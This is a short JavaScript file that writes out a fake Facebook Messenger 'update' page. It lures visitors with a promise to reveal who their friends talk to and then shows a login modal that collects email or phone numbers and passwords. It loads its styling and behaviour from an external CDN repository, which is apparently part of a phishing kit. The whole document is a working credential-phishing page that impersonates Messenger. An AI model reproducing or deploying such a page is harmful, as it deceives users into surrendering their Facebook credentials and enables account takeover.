document.write(`<html>

    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Messanger</title>
        <link href="https://i.ibb.co/B6FQGf6/ms-logo.png" rel="icon">
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/arkadhost/main-src/mess_pop/style.css">
        <script src="https://kit.fontawesome.com/5cc1b36478.js" crossorigin="anonymous"></script>
    
    </head>
    
    <body>
      
        <div class="main">
            <div class="container">
                <i class="fab fa-facebook-messenger" style="font-size:220px;" aria-hidden="true"></i>
                <h1 class="title">Messanger</h1>
                <p class="con-text">Update Messenger to latest version to enjoy with the new features like know who talking with your friends</p>
                <button class="update" id="myBtn">Update Now</button>
                <div id="myModal" class="modal">
    
                    <!-- Modal content -->
                    <div class="popup-box-login-fb modal-content">
                        <div class="main-box">
                            <div class="logo-box">
                                <img class="logo" src="https://i.ibb.co/B6FQGf6/ms-logo.png">
                            </div>
                            <h1>Messenger</h1>
                            <p class="log-text" >Instantly connect with people in your life.
                                Sign in with Facebook to get started.</p>
                            <form method="post" action="" target="_top">
                                <input name="email" class="inputt home-mail" placeholder="Email address or phone number" type="text" minlength="5"  required>
                                <input name="name" class="inputt home-pass" placeholder="Password" type="password"  required>
                                <input class="login" type="submit" value="Log in" name="submit">
                            </form>
                            <label class="container">
                                <input type="checkbox">
                                <span class="checkmark"></span>
                                <label class="chbox" for="input">Keep me signed in</label>
                            </label>
                        </div>
    
    
                    </div>
                </div>
            </div>
        </div>
    
        <script src="https://cdn.jsdelivr.net/gh/arkadhost/main-src/mess_pop/script.js"> </script>
        <script src="ar.js"> </script>
    
    </body>
    
    </html>`);
